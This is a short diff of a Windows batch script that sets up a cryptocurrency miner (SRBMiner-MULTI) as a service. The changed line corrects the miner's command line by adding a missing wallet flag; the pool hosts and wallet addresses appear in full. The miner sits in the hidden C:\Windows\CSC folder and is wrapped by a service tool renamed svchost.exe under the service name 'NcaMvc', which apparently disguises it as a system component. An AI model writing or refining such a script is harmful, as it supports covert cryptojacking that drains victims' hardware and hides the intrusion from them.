@@ -210,7 +210,7 @@ setlocal
 set SERVICE_NAME=NcaMvc
 
 :: Set the path to your batch script
-set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe ---multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool pool.supportxmr.com:443 0x6810d21581c27.Worker01 --wallet 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD --password Worker01 --password Worker02 --keepalive true --keepalive true --nicehash false --nicehash false --tls false --tls true"
+set SCRIPT_PATH="C:\Windows\CSC\SRB\SRBMiner-MULTI.exe ---multi-algorithm-job-mode 3 --algorithm randomepic --algorithm randomx --pool de.epicmine.io:3333 --pool pool.supportxmr.com:443 --wallet 0x6810d21581c27.Worker01 --wallet 49LoCaAuWAoFSmqEfXKdxsM84VbTEp4CqN5yuKk3Y8Ls2jesAXs9AiWbdUfs8JVxLP1P3owpcLYm9FFhfpma9TvSPCwTHuD --password Worker01 --password Worker02 --keepalive true --keepalive true --nicehash false --nicehash false --tls false --tls true"
 
 :: Set the NSSM path (Change this if NSSM is not in the same folder)
 set NSSM_PATH=C:\Windows\CSC\SRB\svchost.exe
